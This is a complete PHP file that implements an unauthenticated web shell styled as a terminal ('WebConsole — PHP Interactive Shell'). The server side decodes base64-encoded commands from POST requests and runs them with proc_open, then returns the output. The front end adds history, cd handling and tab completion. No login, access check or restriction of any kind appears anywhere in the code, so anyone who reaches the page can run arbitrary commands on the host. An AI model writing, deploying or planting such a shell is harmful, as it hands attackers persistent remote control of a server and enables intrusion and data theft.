<?php
/* ============================================================
   WEB CONSOLE — Backend PHP
   ============================================================ */

session_start();

/* ---------- Bootstrap session state ---------- */
if (!isset($_SESSION['cwd'])) {
    $_SESSION['cwd'] = getcwd();
}

/* ---------- Handle AJAX POST requests ---------- */
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    header('Content-Type: application/json');

    $body    = json_decode(file_get_contents('php://input'), true);
    $cmdB64  = $body['cmd']  ?? '';
    $clientCwd = $body['cwd'] ?? $_SESSION['cwd'];

    /* Decode command from Base64 */
    $cmd = base64_decode($cmdB64);
    if ($cmd === false || trim($cmd) === '') {
        echo json_encode(['output' => '', 'cwd' => $_SESSION['cwd']]);
        exit;
    }

    /* Sync working directory from client state */
    $cwd = $clientCwd ?: $_SESSION['cwd'];
    if (!is_dir($cwd)) {
        $cwd = $_SESSION['cwd'];
    }

    /* ---- Special command: cd ---- */
    if (preg_match('/^\s*cd(?:\s+(.+))?\s*$/', $cmd, $m)) {
        $target = isset($m[1]) ? trim($m[1]) : (getenv('HOME') ?: '/');

        /* Resolve ~ */
        if (strpos($target, '~') === 0) {
            $home   = getenv('HOME') ?: '/';
            $target = $home . substr($target, 1);
        }

        /* Relative paths */
        if ($target[0] !== '/') {
            $target = rtrim($cwd, '/') . '/' . $target;
        }

        /* Normalize (resolve ..) */
        $real = realpath($target);
        if ($real !== false && is_dir($real)) {
            $_SESSION['cwd'] = $real;
            echo json_encode(['output' => '', 'cwd' => $real]);
        } else {
            echo json_encode([
                'output' => "bash: cd: $target: No such file or directory\n",
                'cwd'    => $cwd
            ]);
        }
        exit;
    }

    /* ---- Special command: clear / cls ---- */
    if (preg_match('/^\s*(clear|cls)\s*$/', $cmd)) {
        echo json_encode(['output' => "\x00CLEAR", 'cwd' => $_SESSION['cwd']]);
        exit;
    }

    /* ---- Special command: exit ---- */
    if (preg_match('/^\s*exit\s*$/', $cmd)) {
        session_destroy();
        echo json_encode(['output' => "Session ended.\n", 'cwd' => '/']);
        exit;
    }

    /* ---- Move process to correct directory ---- */
    chdir($cwd);

    /* ---- Execute via proc_open ---- */
    $descriptors = [
        0 => ['pipe', 'r'],   // stdin
        1 => ['pipe', 'w'],   // stdout
        2 => ['pipe', 'w'],   // stderr
    ];

    $env  = array_merge($_ENV, ['TERM' => 'xterm-256color']);
    $proc = proc_open($cmd, $descriptors, $pipes, $cwd, $env);

    $output = '';
    if (is_resource($proc)) {
        fclose($pipes[0]);
        $stdout = stream_get_contents($pipes[1]);
        $stderr = stream_get_contents($pipes[2]);
        fclose($pipes[1]);
        fclose($pipes[2]);
        proc_close($proc);
        $output = $stdout !== '' ? $stdout : $stderr;
    } else {
        $output = "Error: Unable to execute command.\n";
    }

    /* Update cwd (in case the command itself changes it — rare but possible) */
    $newCwd = getcwd();
    if ($newCwd && $newCwd !== $cwd) {
        $_SESSION['cwd'] = $newCwd;
    } else {
        $_SESSION['cwd'] = $cwd;
    }

    /* Sanitize binary garbage from output */
    $output = htmlspecialchars_decode(htmlspecialchars($output, ENT_SUBSTITUTE, 'UTF-8'));

    echo json_encode(['output' => $output, 'cwd' => $_SESSION['cwd']]);
    exit;
}

/* ---------- Initial state for page load ---------- */
$initialCwd = $_SESSION['cwd'];
$whoami     = trim(shell_exec('whoami') ?? 'user');
$hostname   = trim(shell_exec('hostname') ?? 'localhost');

?><!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>WebConsole</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600&family=Space+Mono:wght@400;700&display=swap');

  :root {
    --bg:           #0b0d0f;
    --bg2:          #111418;
    --bg3:          #181c21;
    --border:       #1e2530;
    --green:        #39ff86;
    --green-dim:    #1a7a40;
    --cyan:         #00e8ff;
    --cyan-dim:     #0066aa;
    --yellow:       #ffd866;
    --red:          #ff5a5a;
    --muted:        #4a5568;
    --text:         #cdd6e8;
    --text-dim:     #6b7a92;
    --scanline:     rgba(0,0,0,0.06);
    --glow-green:   0 0 8px rgba(57,255,134,0.35);
    --glow-cyan:    0 0 8px rgba(0,232,255,0.3);
    --radius:       6px;
    --font-mono:    'JetBrains Mono', 'Space Mono', 'Cascadia Code', monospace;
  }

  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

  html, body {
    height: 100%;
    background: var(--bg);
    color: var(--text);
    font-family: var(--font-mono);
    font-size: 13px;
    line-height: 1.6;
    overflow: hidden;
  }

  /* CRT scanline overlay */
  body::before {
    content: '';
    position: fixed;
    inset: 0;
    background: repeating-linear-gradient(
      0deg,
      var(--scanline) 0px,
      var(--scanline) 1px,
      transparent 1px,
      transparent 3px
    );
    pointer-events: none;
    z-index: 100;
    opacity: 0.4;
  }

  /* ---- Layout ---- */
  #app {
    display: flex;
    flex-direction: column;
    height: 100vh;
    max-width: 1200px;
    margin: 0 auto;
    padding: 0;
  }

  /* ---- Titlebar ---- */
  #titlebar {
    display: flex;
    align-items: center;
    gap: 10px;
    background: var(--bg3);
    border-bottom: 1px solid var(--border);
    padding: 10px 16px;
    flex-shrink: 0;
    user-select: none;
  }

  .dot { width: 12px; height: 12px; border-radius: 50%; flex-shrink: 0; }
  .dot-red    { background: #ff5f57; }
  .dot-yellow { background: #febc2e; }
  .dot-green  { background: #28c840; }

  #titlebar-label {
    flex: 1;
    text-align: center;
    font-size: 11px;
    color: var(--text-dim);
    letter-spacing: 0.1em;
  }

  #titlebar-status {
    font-size: 11px;
    color: var(--green-dim);
  }

  #titlebar-status.active { color: var(--green); text-shadow: var(--glow-green); }

  /* ---- Output area ---- */
  #output-wrap {
    flex: 1;
    overflow-y: auto;
    padding: 14px 20px 8px;
    background: var(--bg);
    scrollbar-width: thin;
    scrollbar-color: var(--bg3) transparent;
  }

  #output-wrap::-webkit-scrollbar { width: 6px; }
  #output-wrap::-webkit-scrollbar-track { background: transparent; }
  #output-wrap::-webkit-scrollbar-thumb { background: var(--bg3); border-radius: 3px; }

  #output {
    white-space: pre-wrap;
    word-break: break-all;
    font-family: var(--font-mono);
    font-size: 13px;
    color: var(--text);
  }

  /* ---- Prompt lines inside output ---- */
  .line-prompt  { color: var(--green); }
  .line-output  { color: var(--text); }
  .line-error   { color: var(--red); }
  .line-info    { color: var(--cyan); }
  .line-system  { color: var(--text-dim); font-style: italic; }

  /* ---- Banner ---- */
  .banner { color: var(--cyan); opacity: 0.8; }

  /* ---- Input row ---- */
  #input-row {
    display: flex;
    align-items: center;
    background: var(--bg2);
    border-top: 1px solid var(--border);
    padding: 0 16px;
    flex-shrink: 0;
    height: 44px;
  }

  #prompt-label {
    flex-shrink: 0;
    font-family: var(--font-mono);
    font-size: 13px;
    color: var(--green);
    text-shadow: var(--glow-green);
    white-space: nowrap;
    padding-right: 8px;
    cursor: default;
    user-select: none;
  }

  #cmd-input {
    flex: 1;
    background: transparent;
    border: none;
    outline: none;
    color: var(--text);
    font-family: var(--font-mono);
    font-size: 13px;
    caret-color: var(--green);
    height: 100%;
  }

  #cmd-input::selection { background: var(--green-dim); color: #fff; }

  /* ---- Execute button ---- */
  #btn-exec {
    flex-shrink: 0;
    background: transparent;
    border: 1px solid var(--border);
    color: var(--text-dim);
    font-family: var(--font-mono);
    font-size: 11px;
    padding: 4px 10px;
    border-radius: var(--radius);
    cursor: pointer;
    margin-left: 10px;
    transition: all 0.15s;
    letter-spacing: 0.05em;
  }

  #btn-exec:hover { border-color: var(--green-dim); color: var(--green); box-shadow: var(--glow-green); }
  #btn-exec:active { transform: scale(0.97); }

  /* ---- Status bar ---- */
  #statusbar {
    display: flex;
    align-items: center;
    gap: 20px;
    background: var(--bg3);
    border-top: 1px solid var(--border);
    padding: 4px 16px;
    font-size: 11px;
    color: var(--text-dim);
    flex-shrink: 0;
    user-select: none;
  }

  #statusbar span { display: flex; align-items: center; gap: 5px; }

  .sb-dot {
    width: 7px; height: 7px;
    border-radius: 50%;
    background: var(--muted);
    display: inline-block;
  }
  .sb-dot.on { background: var(--green); box-shadow: var(--glow-green); }

  /* ---- Cursor blink in output ---- */
  @keyframes blink { 0%,100%{opacity:1} 50%{opacity:0} }
  #cursor {
    display: inline-block;
    width: 8px; height: 14px;
    background: var(--green);
    vertical-align: text-bottom;
    animation: blink 1.1s step-end infinite;
    box-shadow: var(--glow-green);
  }

  /* ---- Loading indicator ---- */
  @keyframes spin { to { transform: rotate(360deg); } }
  #spinner {
    display: none;
    width: 12px; height: 12px;
    border: 2px solid var(--border);
    border-top-color: var(--green);
    border-radius: 50%;
    animation: spin 0.6s linear infinite;
    flex-shrink: 0;
    margin-left: 8px;
  }
  #spinner.active { display: inline-block; }
</style>
</head>
<body>

<div id="app">

  <!-- Titlebar -->
  <div id="titlebar">
    <span class="dot dot-red"></span>
    <span class="dot dot-yellow"></span>
    <span class="dot dot-green"></span>
    <span id="titlebar-label">WebConsole — PHP Interactive Shell</span>
    <span id="titlebar-status">● CONNECTED</span>
  </div>

  <!-- Output -->
  <div id="output-wrap">
    <pre id="output"></pre>
  </div>

  <!-- Input row -->
  <div id="input-row">
    <span id="prompt-label"></span>
    <input id="cmd-input" type="text" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" placeholder="type a command..." aria-label="Command input">
    <div id="spinner"></div>
    <button id="btn-exec" aria-label="Execute command">RUN ↵</button>
  </div>

  <!-- Status bar -->
  <div id="statusbar">
    <span><span class="sb-dot on" id="conn-dot"></span> PHP SESSION</span>
    <span id="sb-user"></span>
    <span id="sb-cwd" style="overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:420px;"></span>
    <span id="sb-time" style="margin-left:auto;"></span>
  </div>

</div>

<script>
(function () {
  /* ---- State ---- */
  const state = {
    cwd:     <?= json_encode($initialCwd) ?>,
    user:    <?= json_encode($whoami) ?>,
    host:    <?= json_encode($hostname) ?>,
    history: [],
    histIdx: -1,
    busy:    false,
  };

  /* ---- DOM refs ---- */
  const out       = document.getElementById('output');
  const outWrap   = document.getElementById('output-wrap');
  const input     = document.getElementById('cmd-input');
  const prompt    = document.getElementById('prompt-label');
  const spinner   = document.getElementById('spinner');
  const sbUser    = document.getElementById('sb-user');
  const sbCwd     = document.getElementById('sb-cwd');
  const sbTime    = document.getElementById('sb-time');
  const titleSt   = document.getElementById('titlebar-status');
  const connDot   = document.getElementById('conn-dot');
  const btnExec   = document.getElementById('btn-exec');

  /* ---- Helpers ---- */
  function shortPath(p) {
    const home = '/home/' + state.user;
    return p.startsWith(home) ? '~' + p.slice(home.length) : p;
  }

  function buildPromptStr() {
    return state.user + '@' + state.host + ':' + shortPath(state.cwd) + '$ ';
  }

  function updatePrompt() {
    prompt.textContent = buildPromptStr();
    sbUser.textContent = state.user + '@' + state.host;
    sbCwd.textContent  = state.cwd;
  }

  function scrollBottom() {
    outWrap.scrollTop = outWrap.scrollHeight;
  }

  function appendLine(text, cls) {
    const span = document.createElement('span');
    span.className = cls || 'line-output';
    span.textContent = text;
    out.appendChild(span);
  }

  function appendRaw(html) {
    const span = document.createElement('span');
    span.innerHTML = html;
    out.appendChild(span);
  }

  function clearOutput() {
    out.innerHTML = '';
  }

  function setBusy(val) {
    state.busy = val;
    spinner.className = val ? 'active' : '';
    input.disabled    = val;
    btnExec.disabled  = val;
    if (!val) input.focus();
  }

  /* ---- Clock ---- */
  function tick() {
    sbTime.textContent = new Date().toLocaleTimeString();
  }
  tick();
  setInterval(tick, 1000);

  /* ---- Banner ---- */
  const banner = [
    '╔══════════════════════════════════════════════════════╗',
    '║              WebConsole — PHP Backend v1.0           ║',
    '╚══════════════════════════════════════════════════════╝',
    'Type commands below. Use  cd  to navigate directories.',
    'Try: ls -la  |  pwd  |  whoami  |  uname -a  |  clear',
    '',
  ].join('\n');
  const bannerSpan = document.createElement('span');
  bannerSpan.className = 'banner';
  bannerSpan.textContent = banner;
  out.appendChild(bannerSpan);

  /* ---- Initial system info ---- */
  (async function initInfo() {
    try {
      const r = await fetch('', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cmd: btoa('uname -sr && date'), cwd: state.cwd })
      });
      const d = await r.json();
      if (d.output && d.output !== '\x00CLEAR') {
        appendLine(d.output.trim() + '\n\n', 'line-info');
      }
    } catch {}
  })();

  updatePrompt();
  scrollBottom();

  /* ---- Execute command ---- */
  async function execute(raw) {
    const cmd = raw.trim();
    if (!cmd) return;

    /* Echo prompt + command */
    appendLine(buildPromptStr(), 'line-prompt');
    appendLine(cmd + '\n', 'line-output');

    /* History */
    state.history.unshift(cmd);
    if (state.history.length > 200) state.history.pop();
    state.histIdx = -1;

    /* Clear input */
    input.value = '';

    setBusy(true);
    titleSt.textContent = '● RUNNING';
    titleSt.className   = '';

    try {
      const res = await fetch('', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cmd: btoa(cmd), cwd: state.cwd })
      });

      if (!res.ok) throw new Error('HTTP ' + res.status);
      const data = await res.json();

      /* Handle clear signal */
      if (data.output === '\x00CLEAR') {
        clearOutput();
      } else if (data.output && data.output.length > 0) {
        /* Detect stderr-ish output */
        const cls = /error|not found|permission denied|no such/i.test(data.output)
          ? 'line-error' : 'line-output';
        appendLine(data.output, cls);
      }

      /* Update cwd */
      if (data.cwd) {
        state.cwd = data.cwd;
        updatePrompt();
      }

    } catch (err) {
      appendLine('Network error: ' + err.message + '\n', 'line-error');
      titleSt.textContent = '● ERROR';
      titleSt.style.color = 'var(--red)';
      connDot.className   = 'sb-dot';
    } finally {
      titleSt.textContent = '● CONNECTED';
      titleSt.className   = 'active';
      setBusy(false);
      scrollBottom();
    }
  }

  /* ---- Keyboard handling ---- */
  input.addEventListener('keydown', function (e) {
    if (e.key === 'Enter') {
      e.preventDefault();
      if (!state.busy) execute(input.value);
      return;
    }

    /* History navigation */
    if (e.key === 'ArrowUp') {
      e.preventDefault();
      if (state.history.length === 0) return;
      state.histIdx = Math.min(state.histIdx + 1, state.history.length - 1);
      input.value = state.history[state.histIdx];
      setTimeout(() => input.setSelectionRange(input.value.length, input.value.length), 0);
      return;
    }

    if (e.key === 'ArrowDown') {
      e.preventDefault();
      if (state.histIdx <= 0) {
        state.histIdx = -1;
        input.value = '';
        return;
      }
      state.histIdx--;
      input.value = state.history[state.histIdx];
      setTimeout(() => input.setSelectionRange(input.value.length, input.value.length), 0);
      return;
    }

    /* Ctrl+L — clear */
    if (e.ctrlKey && e.key === 'l') {
      e.preventDefault();
      clearOutput();
      return;
    }

    /* Tab — simple autocomplete hint */
    if (e.key === 'Tab') {
      e.preventDefault();
      if (!state.busy && input.value.trim()) {
        const partial = input.value;
        const isPath  = partial.includes('/') || partial.startsWith('.');
        const acCmd   = isPath
          ? 'compgen -f -- ' + partial + ' 2>/dev/null | head -10'
          : 'compgen -c -- ' + partial + ' 2>/dev/null | head -10';
        (async () => {
          setBusy(true);
          try {
            const r = await fetch('', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ cmd: btoa(acCmd), cwd: state.cwd })
            });
            const d = await r.json();
            if (d.output) {
              const opts = d.output.trim().split('\n').filter(Boolean);
              if (opts.length === 1) {
                const words = input.value.split(' ');
                words[words.length - 1] = opts[0];
                input.value = words.join(' ');
              } else if (opts.length > 1) {
                appendLine('\n' + opts.join('  ') + '\n', 'line-info');
                scrollBottom();
              }
            }
          } catch {}
          setBusy(false);
        })();
      }
    }
  });

  /* ---- Run button ---- */
  btnExec.addEventListener('click', () => {
    if (!state.busy) execute(input.value);
  });

  /* ---- Click anywhere on output to refocus input ---- */
  outWrap.addEventListener('click', () => input.focus());

  /* ---- Initial focus ---- */
  input.focus();

  /* ---- Mark connected ---- */
  titleSt.className = 'active';

})();
</script>
</body>
</html>
